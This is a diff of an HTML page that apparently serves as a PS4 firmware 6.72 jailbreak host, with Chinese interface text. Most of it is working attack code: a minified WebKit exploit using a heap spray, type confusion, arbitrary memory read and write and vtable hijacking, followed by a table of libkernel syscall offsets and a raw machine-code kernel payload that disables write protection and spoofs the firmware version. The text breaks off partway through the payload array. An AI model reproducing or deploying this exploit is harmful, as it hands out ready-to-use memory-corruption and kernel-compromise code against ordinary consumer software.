@@ -1,551 +1,202 @@
-<!DOCTYPE html>
-	<html lang="en">	
-  	<head>
-    	<title>ESP8266 破解服务 by c0d3m4st4 - 6.72</title>
-		<meta charset="UTF-8">
-    	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
-		<link rel="icon" type="image/x-icon" href="favicon.ico">		
-		<link rel="stylesheet" href="owl.carousel.min.css">
-		
-		<style type="text/css">
+<html manifest="cache.manifest">
+<head>
+<meta charset="utf-8">
+<title>PS4 破解 6.72</title>
+<link rel="stylesheet prefetch" href="Style.css">
+<script>
+var leaker_obj={a:0};var leaker_arr=new Uint32Array(6);var oob_slave=new Uint8Array(1024);var oob_master=new Uint32Array(7);var spray=[];function spray_one(){var x=new Uint32Array(1);x[spray.length+'spray']=123;spray.push(x);}for(var i=0;i<0x10000;i++)spray_one();var target={a:2.1100820415101592e-303,b:false,c:true,d:5678};var target2={a:2.1100820415101592e-303,b:false,c:true,e:5678};var impl_idx=0;function create_impl(){var ans={a:target};for(var i=0;i<32;i++)ans[(impl_idx++)+'x']={};return ans;}function trigger(x){if(impl.a!=target){print("wtf?");while(1);}var o={a:1};for(var i in o){{i=x;function i(){};}o[i];}if(impl.a!=target){print("corrupted!");print(typeof(impl.a));print(impl.a.length);target.c=leaker_obj;leaker_obj.a=leaker_obj;var l1=impl.a[4];var l2=impl.a[5];leaker_obj.a=oob_slave;var s1=impl.a[4];var s2=impl.a[5];target.c=leaker_arr;impl.a[4]=l1;impl.a[5]=l2;target.c=oob_master;impl.a[4]=s1;impl.a[5]=s2;impl.a=target;print([l1,l2,s1,s2]);throw"exploit fucking finished";}}try{for(var _=0;_<1024;_++){var impl=create_impl();var s={a:impl};trigger(s);}}catch(e){print("error: "+e);}function i48_put(x,a){a[4]=x|0;a[5]=(x/4294967296)|0;}function i48_get(a){return a[4]+a[5]*4294967296;}function addrof(x){leaker_obj.a=x;return i48_get(leaker_arr);}function fakeobj(x){i48_put(x,leaker_arr);return leaker_obj.a;}function read_mem_setup(p,sz){i48_put(p,oob_master);oob_master[6]=sz;}function read_mem(p,sz){read_mem_setup(p,sz);var arr=[];for(var i=0;i<sz;i++)arr.push(oob_slave[i]);return arr;}function read_mem_s(p,sz){read_mem_setup(p,sz);return""+oob_slave;}function read_mem_b(p,sz){read_mem_setup(p,sz);var b=new Uint8Array(sz);b.set(oob_slave);return b;}function read_mem_as_string(p,sz){var x=read_mem_b(p,sz);var ans='';for(var i=0;i<x.length;i++)ans+=String.fromCharCode(x[i]);return ans;}function write_mem(p,data){i48_put(p,oob_master);oob_master[6]=data.length;for(var i=0;i<data.length;i++)oob_slave[i]=data[i];}function read_ptr_at(p){var ans=0;var d=read_mem(p,8);for(var i=7;i>=0;i--)ans=256*ans+d[i];return ans;}function write_ptr_at(p,d){var arr=[];for(var i=0;i<8;i++){arr.push(d&0xff);d/=256;}write_mem(p,arr);}function hex(x){return(new Number(x)).toString(16);}var malloc_nogc=[];function malloc(sz){var arr=new Uint8Array(sz);malloc_nogc.push(arr);return read_ptr_at(addrof(arr)+0x10);}var tarea=document.createElement('textarea');var real_vt_ptr=read_ptr_at(addrof(tarea)+0x18);var fake_vt_ptr=malloc(0x400);write_mem(fake_vt_ptr,read_mem(real_vt_ptr,0x400));var real_vtable=read_ptr_at(fake_vt_ptr);var fake_vtable=malloc(0x2000);write_mem(fake_vtable,read_mem(real_vtable,0x2000));write_ptr_at(fake_vt_ptr,fake_vtable);var fake_vt_ptr_bak=malloc(0x400);write_mem(fake_vt_ptr_bak,read_mem(fake_vt_ptr,0x400));var plt_ptr=read_ptr_at(fake_vtable)-10063176;function get_got_addr(idx){var p=plt_ptr+idx*16;var q=read_mem(p,6);if(q[0]!=0xff||q[1]!=0x25)throw"invalid GOT entry";var offset=0;for(var i=5;i>=2;i--)offset=offset*256+q[i];offset+=p+6;return read_ptr_at(offset);}var webkit_base=read_ptr_at(fake_vtable);var libkernel_base=get_got_addr(705)-0x10000;var libc_base=get_got_addr(582);var saveall_addr=libc_base+0x2e2c8;var loadall_addr=libc_base+0x3275c;var setjmp_addr=libc_base+0xbfae0;var longjmp_addr=libc_base+0xbfb30;var pivot_addr=libc_base+0x327d2;var infloop_addr=libc_base+0x447a0;var jop_frame_addr=libc_base+0x715d0;var get_errno_addr_addr=libkernel_base+0x9ff0;var pthread_create_addr=libkernel_base+0xf980;function saveall(){var ans=malloc(0x800);var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);tarea.scrollLeft=0;write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);write_mem(ans,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);write_ptr_at(fake_vt_ptr+0x38,0x1234);write_ptr_ataddroftarea+0x18, fake_vt_ptr;tarea.scrollLeft=0;write_ptr_ataddroftarea+0x18, real_vt_ptr;write_mem(ans+0x400,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));return ans;}function pivot(buf){var ans=malloc(0x400);var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);tarea.scrollLeft=0;write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);write_mem(ans,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,pivot_addr);write_ptr_at(fake_vt_ptr+0x38,buf);write_ptr_at(ans+0x38,read_ptr_at(ans+0x38)-16);write_ptr_at(buf,ans);write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);tarea.scrollLeft=0;write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));}var aio_init_addr=libkernel_base+126912,fpathconf_addr=libkernel_base+126944,dmem_container_addr=libkernel_base+126976,evf_clear_addr=libkernel_base+127008,kqueue_addr=libkernel_base+127040,kevent_addr=libkernel_base+127072,futimes_addr=libkernel_base+127104,open_addr=libkernel_base+127136,thr_self_addr=libkernel_base+127168,mkdir_addr=libkernel_base+127200,pipe_addr=libkernel_base+127232,stat_addr=libkernel_base+127280,write_addr=libkernel_base+127312,evf_cancel_addr=libkernel_base+127344,ktimer_delete_addr=libkernel_base+127376,setregid_addr=libkernel_base+127408,jitshm_create_addr=libkernel_base+127440,sigwait_addr=libkernel_base+127472,fdatasync_addr=libkernel_base+127504,sigtimedwait_addr=libkernel_base+127536,get_gpo_addr=libkernel_base+127568,sched_setscheduler_addr=libkernel_base+127600,osem_open_addr=libkernel_base+127632,dynlib_get_info_addr=libkernel_base+127664,osem_post_addr=libkernel_base+127712,blockpool_move_addr=libkernel_base+127744,issetugid_addr=libkernel_base+127776,getdents_addr=libkernel_base+127808,rtprio_thread_addr=libkernel_base+127840,evf_delete_addr=libkernel_base+127872,_umtx_op_addr=libkernel_base+127904,access_addr=libkernel_base+127936,reboot_addr=libkernel_base+127968,sigaltstack_addr=libkernel_base+128e3,getcontext_addr=libkernel_base+128036,munmap_addr=libkernel_base+128080,setuid_addr=libkernel_base+128112,evf_trywait_addr=libkernel_base+128144,setcontext_addr=libkernel_base+128176,dynlib_get_list_addr=libkernel_base+128208,setsid_addr=libkernel_base+128240,fstatfs_addr=libkernel_base+128272,aio_multi_wait_addr=libkernel_base+128304,accept_addr=libkernel_base+128336,set_phys_fmem_limit_addr=libkernel_base+128368,thr_get_name_addr=libkernel_base+128400,get_page_table_stats_addr=libkernel_base+128432,sigsuspend_addr=libkernel_base+128464,truncate_addr=libkernel_base+128496,fsync_addr=libkernel_base+128528,execve_addr=libkernel_base+128573,evf_open_addr=libkernel_base+128608,netabort_addr=libkernel_base+128640,blockpool_unmap_addr=libkernel_base+128672,osem_create_addr=libkernel_base+128704,getlogin_addr=libkernel_base+128736,mincore_addr=libkernel_base+128768,shutdown_addr=libkernel_base+128800,profil_addr=libkernel_base+128832,preadv_addr=libkernel_base+128864,geteuid_addr=libkernel_base+128896,set_chicken_switches_addr=libkernel_base+128928,sigqueue_addr=libkernel_base+128960,aio_multi_poll_addr=libkernel_base+128992,get_self_auth_info_addr=libkernel_base+129024,opmc_enable_addr=libkernel_base+129056,aio_multi_delete_addr=libkernel_base+129088,rfork_addr=libkernel_base+129129,sys_exit_addr=libkernel_base+129162,blockpool_batch_addr=libkernel_base+129200,sigpending_addr=libkernel_base+129232,ktimer_gettime_addr=libkernel_base+129264,opmc_set_ctr_addr=libkernel_base+129296,ksem_wait_addr=libkernel_base+129328,sched_getparam_addr=libkernel_base+129360,swapcontext_addr=libkernel_base+129392,opmc_get_ctr_addr=libkernel_base+129424,budget_get_ptype_addr=libkernel_base+129456,msync_addr=libkernel_base+129488,sigwaitinfo_addr=libkernel_base+129520,lstat_addr=libkernel_base+129552,test_debug_rwmem_addr=libkernel_base+129584,evf_create_addr=libkernel_base+129616,madvise_addr=libkernel_base+129648,cpuset_getaffinity_addr=libkernel_base+129680,evf_set_addr=libkernel_base+129712,setlogin_addr=libkernel_base+129744,ksem_init_addr=libkernel_base+129792,opmc_disable_addr=libkernel_base+129824,namedobj_delete_addr=libkernel_base+129856,gettimeofday_addr=libkernel_base+129888,read_addr=libkernel_base+129920,thr_get_ucontext_addr=libkernel_base+129952,batch_map_addr=libkernel_base+129984,sysarch_addr=libkernel_base+130016,utc_to_localtime_addr=libkernel_base+130048,evf_close_addr=libkernel_base+130080,setrlimit_addr=libkernel_base+130112,getpeername_addr=libkernel_base+130144,aio_get_data_addr=libkernel_base+130176,lseek_addr=libkernel_base+130208,connect_addr=libkernel_base+130240,recvfrom_addr=libkernel_base+130272,getrlimit_addr=libkernel_base+130304,dynlib_get_info_for_libdbg_addr=libkernel_base+130336,thr_suspend_ucontext_addr=libkernel_base+130368,_umtx_op_addr=libkernel_base+130400,kill_addr=libkernel_base+130416,dynlib_process_needed_and_relocate_addr=libkernel_base+130448,getsockname_addr=libkernel_base+130480,osem_trywait_addr=libkernel_base+130512,execve_addr=libkernel_base+130544,flock_addr=libkernel_base+130576,sigreturn_addr=libkernel_base+130608,query_memory_protection_addr=libkernel_base+130640,pwrite_addr=libkernel_base+130672,get_map_statistics_addr=libkernel_base+130704,ksem_getvalue_addr=libkernel_base+130736,sendfile_addr=libkernel_base+130768,socketex_addr=libkernel_base+130800,unlink_addr=libkernel_base+130832,thr_resume_ucontext_addr=libkernel_base+130864,dl_get_list_addr=libkernel_base+130896,cpuset_setaffinity_addr=libkernel_base+130928,clock_gettime_addr=libkernel_base+130960,thr_kill2_addr=libkernel_base+130992,set_timezone_info_addr=libkernel_base+131024,select_addr=libkernel_base+131056,pselect_addr=libkernel_base+131088,sync_addr=libkernel_base+131120,socketpair_addr=libkernel_base+131152,get_kernel_mem_statistics_addr=libkernel_base+131184,virtual_query_all_addr=libkernel_base+131216,physhm_open_addr=libkernel_base+131248,getuid_addr=libkernel_base+131280,revoke_addr=libkernel_base+131312,sigprocmask_addr=libkernel_base+131347,setegid_addr=libkernel_base+131488,cpuset_getid_addr=libkernel_base+131520,evf_wait_addr=libkernel_base+131552,sched_get_priority_max_addr=libkernel_base+131584,sigaction_addr=libkernel_base+131616,ipmimgr_call_addr=libkernel_base+131648,aio_submit_cmd_addr=libkernel_base+131680,free_stack_addr=libkernel_base+131712,settimeofday_addr=libkernel_base+131744,recvmsg_addr=libkernel_base+131776,aio_submit_addr=libkernel_base+131808,setgroups_addr=libkernel_base+131840,aio_multi_cancel_addr=libkernel_base+131872,nanosleep_addr=libkernel_base+131904,blockpool_map_addr=libkernel_base+131936,thr_create_addr=libkernel_base+131968,munlockall_addr=libkernel_base+132e3,dynlib_get_info_ex_addr=libkernel_base+132032,pwritev_addr=libkernel_base+132064,mname_addr=libkernel_base+132096,regmgr_call_addr=libkernel_base+132128,getgroups_addr=libkernel_base+132160,osem_close_addr=libkernel_base+132192,osem_delete_addr=libkernel_base+132224,dynlib_get_obj_member_addr=libkernel_base+132256,debug_init_addr=libkernel_base+132288,mmap_dmem_addr=libkernel_base+132320,kldunloadf_addr=libkernel_base+132352,mprotect_addr=libkernel_base+132384,ksem_trywait_addr=libkernel_base+132592,ksem_close_addr=libkernel_base+132624,sched_rr_get_interval_addr=libkernel_base+132656,getitimer_addr=libkernel_base+132688,getpid_addr=libkernel_base+132720,netgetsockinfo_addr=libkernel_base+132752,get_cpu_usage_all_addr=libkernel_base+132784,eport_delete_addr=libkernel_base+132816,randomized_path_addr=libkernel_base+132848,jitshm_alias_addr=libkernel_base+132880,seteuid_addr=libkernel_base+132912,set_uevt_addr=libkernel_base+132944,clock_getres_addr=libkernel_base+132976,setitimer_addr=libkernel_base+133008,thr_exit_addr=libkernel_base+133040,sandbox_path_addr=libkernel_base+133072,thr_kill_addr=libkernel_base+133104,sys_exit_addr=libkernel_base+133136,dup2_addr=libkernel_base+133168,utimes_addr=libkernel_base+133200,pread_addr=libkernel_base+133232,dl_get_info_addr=libkernel_base+133264,ktimer_settime_addr=libkernel_base+133296,sched_setparam_addr=libkernel_base+133328,aio_create_addr=libkernel_base+133360,osem_wait_addr=libkernel_base+133392,dynlib_get_list_for_libdbg_addr=libkernel_base+133424,get_proc_type_info_addr=libkernel_base+133456,getgid_addr=libkernel_base+133488,fstat_addr=libkernel_base+133520,fork_addr=libkernel_base+133552,namedobj_create_addr=libkernel_base+133584,opmc_set_ctl_addr=libkernel_base+133616,get_resident_count_addr=libkernel_base+133648,getdirentries_addr=libkernel_base+133680,getrusage_addr=libkernel_base+133712,setreuid_addr=libkernel_base+133744,wait4_addr=libkernel_base+133776,__sysctl_addr=libkernel_base+133808,bind_addr=libkernel_base+133840,sched_yield_addr=libkernel_base+133872,dl_get_metadata_addr=libkernel_base+133904,get_resident_fmem_count_addr=libkernel_base+133936,setsockopt_addr=libkernel_base+133968,dynlib_load_prx_addr=libkernel_base+134e3,getpriority_addr=libkernel_base+134032,get_phys_page_size_addr=libkernel_base+134064,opmc_set_hw_addr=libkernel_base+134096,dynlib_do_copy_relocations_addr=libkernel_base+134128,netcontrol_addr=libkernel_base+134160,ksem_post_addr=libkernel_base+134192,netgetiflist_addr=libkernel_base+134224,chmod_addr=libkernel_base+134256,aio_suspend_addr=libkernel_base+134288,ksem_timedwait_addr=libkernel_base+134320,dynlib_dlsym_addr=libkernel_base+134352,get_paging_stats_of_all_objects_addr=libkernel_base+134384,osem_cancel_addr=libkernel_base+134416,writev_addr=libkernel_base+134448,ktimer_getoverrun_addr=libkernel_base+134480,rmdir_addr=libkernel_base+134512,sched_get_priority_min_addr=libkernel_base+134544,dynlib_unload_prx_addr=libkernel_base+134576,thr_set_name_addr=libkernel_base+134608,mlockall_addr=libkernel_base+134640,openat_addr=libkernel_base+134672,eport_open_addr=libkernel_base+134704,sigprocmask_addr=libkernel_base+134736,chdir_addr=libkernel_base+134768,physhm_unlink_addr=libkernel_base+134800,mtypeprotect_addr=libkernel_base+134832,thr_wake_addr=libkernel_base+134864,blockpool_open_addr=libkernel_base+134896,thr_new_addr=libkernel_base+134928,munlock_addr=libkernel_base+134960,fchflags_addr=libkernel_base+134992,ftruncate_addr=libkernel_base+135024,rename_addr=libkernel_base+135056,poll_addr=libkernel_base+135088,eport_trigger_addr=libkernel_base+135120,getsid_addr=libkernel_base+135152,virtual_query_addr=libkernel_base+135184,fchmod_addr=libkernel_base+135216,_umtx_unlock_addr=libkernel_base+135248,mmap_addr=libkernel_base+135280,ktimer_create_addr=libkernel_base+135312,dup_addr=libkernel_base+135344,sendmsg_addr=libkernel_base+135376,close_addr=libkernel_base+135408,is_development_mode_addr=libkernel_base+135440,getegid_addr=libkernel_base+135472,get_vm_map_timestamp_addr=libkernel_base+135504,dynlib_get_proc_param_addr=libkernel_base+135536,fcntl_addr=libkernel_base+135568,getppid_addr=libkernel_base+135600,readv_addr=libkernel_base+135632,rdup_addr=libkernel_base+135664,listen_addr=libkernel_base+135696,app_state_change_addr=libkernel_base+135728,set_gpo_addr=libkernel_base+135760,ksem_unlink_addr=libkernel_base+135792,get_cpu_usage_proc_addr=libkernel_base+135824,shm_unlink_addr=libkernel_base+135856,reserve_2mb_page_addr=libkernel_base+135888,dynlib_get_info2_addr=libkernel_base+135920,mlock_addr=libkernel_base+135952,workaround8849_addr=libkernel_base+135984,get_sdk_compiled_version_addr=libkernel_base+136016,clock_settime_addr=libkernel_base+136048,ksem_destroy_addr=libkernel_base+136080,ksem_open_addr=libkernel_base+136112,thr_set_ucontext_addr=libkernel_base+136144,get_bio_usage_all_addr=libkernel_base+136176,getdtablesize_addr=libkernel_base+136208,chflags_addr=libkernel_base+136240,shm_open_addr=libkernel_base+136272,eport_close_addr=libkernel_base+136304,dynlib_get_list2_addr=libkernel_base+136336,socketclose_addr=libkernel_base+136368,sched_getscheduler_addr=libkernel_base+136400,pathconf_addr=libkernel_base+136432,localtime_to_utc_addr=libkernel_base+136464,setpriority_addr=libkernel_base+136496,cpumode_yield_addr=libkernel_base+136528,process_terminate_addr=libkernel_base+136560,ioctl_addr=libkernel_base+136592,opmc_get_hw_addr=libkernel_base+136624,eport_create_addr=libkernel_base+136656,socket_addr=libkernel_base+136688,_umtx_lock_addr=libkernel_base+136720,thr_suspend_addr=libkernel_base+136752,is_in_sandbox_addr=libkernel_base+136784,get_authinfo_addr=libkernel_base+136816,mdbg_service_addr=libkernel_base+136848,getsockopt_addr=libkernel_base+136880,get_paging_stats_of_all_threads_addr=libkernel_base+136912,adjtime_addr=libkernel_base+136944,kqueueex_addr=libkernel_base+136976,uuidgen_addr=libkernel_base+137008,set_vm_container_addr=libkernel_base+137040,sendto_addr=libkernel_base+137072;
+</script>
+ <script src="jb.js"></script>
+<script>
+function DLProgress(e){
+	parent.ScrOverlay.style.display="block";
+	Percent=(Math.round(e.loaded / e.total * 100));
+	parent.cacheUPDtxt.innerHTML="正在安装离线页面缓存: " + Percent + "%";
+	parent.CacheBar.style.width=Percent + '%';
+}
+function DisplayCacheProgress(){
+	setTimeout(function(){parent.cacheUPDtxt.innerHTML="离线缓存顺利完成. 请重启 PS4 & 重新打开本页面!!";},1000);}
+	window.applicationCache.addEventListener("progress",DLProgress,false);
+	window.applicationCache.oncached=function(e){DisplayCacheProgress();};
+	window.applicationCache.onupdateready=function(e){DisplayCacheProgress();};
+	window.applicationCache.onerror=function(e){parent.cacheUPDtxt.innerHTML="页面缓存错误";
+};
 
-			html, body {
-				font-family:Impact, Charcoal, sans-serif;
-				text-align: center;	
-			}
+function spoof() {var payload = [233,14,0,0,0,72,137,254,191,222,0,0,0,255,37,5,20,0,0,83,72,137,251,232,27,10,0,0,232,108,4,0,0,72,141,53,49,0,0,0,72,137,218,191,11,0,0,0,49,192,232,185,13,0,0,232,189,0,0,0,72,141,61,219,13,0,0,232,189,255,255,255,49,192,91,195,72,137,249,15,50,72,193,226,32,72,9,208,195,72,139,71,8,185,130,0,0,192,72,139,112,64,76,139,64,72,15,50,72,137,209,72,139,150,24,1,0,0,72,193,225,32,72,9,200,72,45,192,1,0,0,199,70,4,0,0,0,0,199,70,8,0,0,0,0,72,131,201,255,199,70,20,0,0,0,0,199,2,0,0,0,0,72,139,144,24,229,19,1,72,137,86,48,72,139,144,32,3,48,2,73,137,80,32,73,137,80,24,72,139,151,48,1,0,0,72,191,19,0,0,0,0,0,1,56,72,137,74,96,72,137,122,88,72,137,74,104,15,32,194,72,137,209,72,129,225,255,255,254,255,15,34,193,199,128,72,66,168,1,33,128,fw2,fw1,15,34,194,49,192,195,85,83,69,49,201,80,69,49,192,49,201,49,210,49,246,72,141,61,33,13,0,0,255,21,211,21,0,0,49,201,69,49,201,137,197,69,49,192,49,210,49,246,72,141,61,44,13,0,0,255,21,184,21,0,0,137,239,72,141,21,223,18,0,0,137,195,72,141,53,64,13,0,0,232,58,8,0,0,89,137,223,91,72,141,21,222,18,0,0,93,72,141,53,81,13,0,0,233,34,8,0,0,83,72,137,250,72,129,236,0,2,0,0,72,141,53,91,13,0,0,72,137,231,49,192,255,21,84,20,0,0,72,137,230,191,129,0,0,0,255,21,142,18,0,0,72,129,196,0,2,0,0,91,195,49,246,255,37,149,18,0,0,83,69,49,201,72,131,236,16,69,49,192,49,201,49,210,49,246,72,141,61,35,13,0,0,255,21,47,21,0,0,72,141,21,96,18,0,0,72,141,53,57,13,0,0,137,195,137,199,232,177,7,0,0,72,141,21,105,18,0,0,72,141,53,59,13,0,0,137,223,232,156,7,0,0,72,141,21,92,18,0,0,72,141,53,71,13,0,0,137,223,232,135,7,0,0,49,255,255,21,30,18,0,0,133,192,117,19,72,137,231,255,21,49,18,0,0,133,192,117,6,255,21,47,18,0,0,72,139,4,36,72,139,84,36,8,72,131,196,16,91,195,83,69,49,201,72,131,236,16,69,49,192,49,201,49,210,49,246,72,141,61,150,12,0,0,255,21,162,20,0,0,72,141,21,211,17,0,0,72,141,53,172,12,0,0,137,195,137,199,232,36,7,0,0,72,141,21,220,17,0,0,72,141,53,174,12,0,0,137,223,232,15,7,0,0,72,141,21,207,17,0,0,72,141,53,186,12,0,0,137,223,232,250,6,0,0,49,255,255,21,145,17,0,0,133,192,116,5,131,200,255,235,28,72,137,231,255,21,159,17,0,0,133,192,117,238,131,60,36,255,116,232,255,21,151,17,0,0,139,4,36,72,131,196,16,91,195,65,84,85,83,65,137,252,72,131,236,32,191,16,0,0,0,255,21,192,17,0,0,69,49,201,69,49,192,49,201,49,210,49,246,72,141,61,243,11,0,0,72,137,197,255,21,252,19,0,0,72,141,21,45,17,0,0,72,141,53,6,12,0,0,137,195,137,199,232,126,6,0,0,72,141,21,46,17,0,0,72,141,53,65,12,0,0,137,223,232,105,6,0,0,72,141,21,41,17,0,0,72,141,53,20,12,0,0,137,223,232,84,6,0,0,49,255,255,21,235,16,0,0,49,210,133,192,117,51,72,141,92,36,15,186,17,0,0,0,72,137,222,68,137,231,255,21,231,16,0,0,49,210,133,192,117,23,72,137,222,72,137,239,255,21,245,16,0,0,49,192,255,21,221,16,0,0,72,137,234,72,131,196,32,72,137,208,91,93,65,92,195,83,69,49,201,72,131,236,16,69,49,192,49,201,49,210,49,246,72,141,61,68,11,0,0,255,21,80,19,0,0,72,141,21,137,16,0,0,72,141,53,198,11,0,0,137,195,137,199,232,210,5,0,0,72,141,21,106,16,0,0,72,141,53,67,11,0,0,137,223,232,189,5,0,0,72,141,21,125,16,0,0,72,141,53,104,11,0,0,137,223,232,168,5,0,0,49,255,255,21,63,16,0,0,133,192,117,25,72,141,124,36,12,255,21,56,16,0,0,133,192,117,10,255,21,78,16,0,0,139,68,36,12,72,131,196,16,91,195,83,72,141,53,125,11,0,0,191,28,2,0,0,49,192,232,216,9,0,0,186,0,64,0,0,49,201,72,137,195,137,198,191,34,2,0,0,49,192,232,192,9,0,0,137,222,191,29,2,0,0,49,192,232,178,9,0,0,91,186,30,0,0,0,190,1,0,0,0,191,37,0,0,0,49,192,233,155,9,0,0,69,49,201,80,69,49,192,49,201,49,210,49,246,72,141,61,49,11,0,0,255,21,121,18,0,0,72,141,21,218,15,0,0,72,141,53,63,11,0,0,137,199,232,253,4,0,0,90,49,192,255,37,195,15,0,0,83,69,49,201,69,49,192,49,201,49,210,49,246,72,141,61,43,11,0,0,255,21,65,18,0,0,72,141,21,226,15,0,0,72,141,53,47,11,0,0,137,195,137,199,232,195,4,0,0,137,223,72,141,21,97,17,0,0,72,141,53,29,11,0,0,232,174,4,0,0,137,223,72,141,21,220,15,0,0,72,141,53,13,11,0,0,232,153,4,0,0,137,223,72,141,21,55,16,0,0,72,141,53,255,10,0,0,232,132,4,0,0,137,223,72,141,21,194,16,0,0,72,141,53,242,10,0,0,232,111,4,0,0,137,223,72,141,21,109,16,0,0,72,141,53,230,10,0,0,232,90,4,0,0,137,223,72,141,21,72,15,0,0,72,141,53,216,10,0,0,232,69,4,0,0,137,223,72,141,21,243,15,0,0,72,141,53,202,10,0,0,232,48,4,0,0,137,223,72,141,21,254,14,0,0,72,141,53,188,10,0,0,232,27,4,0,0,137,223,72,141,21,177,15,0,0,72,141,53,174,10,0,0,232,6,4,0,0,137,223,72,141,21,92,15,0,0,72,141,53,161,10,0,0,232,241,3,0,0,137,223,72,141,21,175,15,0,0,72,141,53,147,10,0,0,232,220,3,0,0,137,223,72,141,21,90,16,0,0,72,141,53,134,10,0,0,232,199,3,0,0,137,223,72,141,21,245,15,0,0,72,141,53,120,10,0,0,232,178,3,0,0,137,223,72,141,21,64,15,0,0,72,141,53,106,10,0,0,232,157,3,0,0,137,223,72,141,21,227,15,0,0,72,141,53,93,10,0,0,232,136,3,0,0,137,223,72,141,21,110,14,0,0,72,141,53,80,10,0,0,232,115,3,0,0,137,223,72,141,21,41,15,0,0,72,141,53,68,10,0,0,232,94,3,0,0,137,223,72,141,21,228,15,0,0,72,141,53,54,10,0,0,232,73,3,0,0,137,223,72,141,21,111,14,0,0,72,141,53,40,10,0,0,232,52,3,0,0,137,223,72,141,21,162,14,0,0,72,141,53,27,10,0,0,232,31,3,0,0,137,223,72,141,21,245,14,0,0,72,141,53,13,10,0,0,232,10,3,0,0,137,223,72,141,21,232,14,0,0,72,141,53,0,10,0,0,232,245,2,0,0,137,223,72,141,21,43,14,0,0,72,141,53,234,9,0,0,232,224,2,0,0,137,223,72,141,21,62,15,0,0,72,141,53,220,9,0,0,232,203,2,0,0,137,223,72,141,21,57,15,0,0,72,141,53,207,9,0,0,232,182,2,0,0,137,223,72,141,21,60,14,0,0,72,141,53,191,9,0,0,232,161,2,0,0,137,223,72,141,21,127,13,0,0,72,141,53,178,9,0,0,232,140,2,0,0,137,223,72,141,21,202,13,0,0,72,141,53,166,9,0,0,232,119,2,0,0,137,223,72,141,21,69,14,0,0,72,141,53,156,9,0,0,232,98,2,0,0,137,223,72,141,21,8,14,0,0,72,141,53,142,9,0,0,232,77,2,0,0,137,223,72,141,21,91,14,0,0,72,141,53,127,9,0,0,232,56,2,0,0,137,223,72,141,21,174,13,0,0,72,141,53,107,9,0,0,232,35,2,0,0,137,223,72,141,21,249,12,0,0,72,141,53,91,9,0,0,232,14,2,0,0,137,223,72,141,21,252,13,0,0,72,141,53,78,9,0,0,232,249,1,0,0,137,223,72,141,21,71,13,0,0,72,141,53,51,9,0,0,232,228,1,0,0,137,223,72,141,21,50,14,0,0,72,141,53,38,9,0,0,232,207,1,0,0,137,223,72,141,21,237,13,0,0,72,141,53,10,9,0,0,232,186,1,0,0,137,223,72,141,21,48,14,0,0,72,141,53,4,9,0,0,232,165,1,0,0,137,223,72,141,21,219,13,0,0,72,141,53,246,8,0,0,232,144,1,0,0,137,223,72,141,21,134,13,0,0,72,141,53,234,8,0,0,232,123,1,0,0,137,223,72,141,21,209,13,0,0,72,141,53,223,8,0,0,232,102,1,0,0,137,223,72,141,21,204,12,0,0,72,141,53,214,8,0,0,232,81,1,0,0,137,223,72,141,21,119,13,0,0,72,141,53,200,8,0,0,232,60,1,0,0,137,223,72,141,21,90,12,0,0,72,141,53,187,8,0,0,232,39,1,0,0,137,223,72,141,21,53,12,0,0,72,141,53,174,8,0,0,232,18,1,0,0,137,223,72,141,21,168,13,0,0,72,141,53,163,8,0,0,232,253,0,0,0,137,223,72,141,21,243,11,0,0,72,141,53,150,8,0,0,232,232,0,0,0,137,223,72,141,21,230,11,0,0,72,141,53,137,8,0,0,232,211,0,0,0,137,223,72,141,21,97,13,0,0,72,141,53,126,8,0,0,232,190,0,0,0,137,223,72,141,21,60,12,0,0,72,141,53,114,8,0,0,232,169,0,0,0,137,223,72,141,21,191,11,0,0,72,141,53,99,8,0,0,232,148,0,0,0,137,223,72,141,21,122,12,0,0,72,141,53,90,8,0,0,232,127,0,0,0,137,223,72,141,21,69,12,0,0,72,141,53,75,8,0,0,232,106,0,0,0,137,223,72,141,21,208,12,0,0,72,141,53,60,8,0,0,232,85,0,0,0,137,223,72,141,21,179,11,0,0,72,141,53,46,8,0,0,232,64,0,0,0,137,223,72,141,21,70,12,0,0,72,141,53,31,8,0,0,232,43,0,0,0,137,223,72,141,21,65,12,0,0,72,141,53,16,8,0,0,232,22,0,0,0,137,223,91,72,141,21,91,11,0,0,72,141,53,1,8,0,0,233,0,0,0,0,72,199,192,79,2,0,0,233,102,4,0,0,72,199,192,80,2,0,0,233,90,4,0,0,80,72,199,6,96,1,0,0,72,137,242,49,192,137,254,191,81,2,0,0,232,62,4,0,0,90,195,72,137,241,80,49,210,72,137,254,69,49,192,191,82,2,0,0,49,192,232,36,4,0,0,90,195,137,254,80,49,210,49,201,191,83,2,0,0,49,192,232,15,4,0,0,90,195,49,201,80,49,210,49,246,72,141,61,148,7,0,0,69,49,201,69,49,192,255,21,235,12,0,0,89,72,141,21,43,12,0,0,72,141,53,142,7,0,0,137,199,233,110,255,255,255,72,199,192,37,0,0,0,233,212,3,0,0,72,199,192,54,0,0,0,233,200,3,0,0,72,199,192,11,0,0,0,233,188,3,0,0,72,141,53,10,12,0,0,82,72,141,61,103,5,0,0,72,199,5,119,12,0,0,0,0,0,0,232,94,255,255,255,133,192,116,42,72,141,53,231,11,0,0,72,141,61,73,7,0,0,232,71,255,255,255,133,192,116,19,72,141,53,208,11,0,0,72,141,61,69,7,0,0,232,48,255,255,255,139,61,190,11,0,0,72,141,21,191,11,0,0,72,141,53,63,7,0,0,232,228,254,255,255,139,61,165,11,0,0,72,141,21,230,11,0,0,72,141,53,56,7,0,0,232,203,254,255,2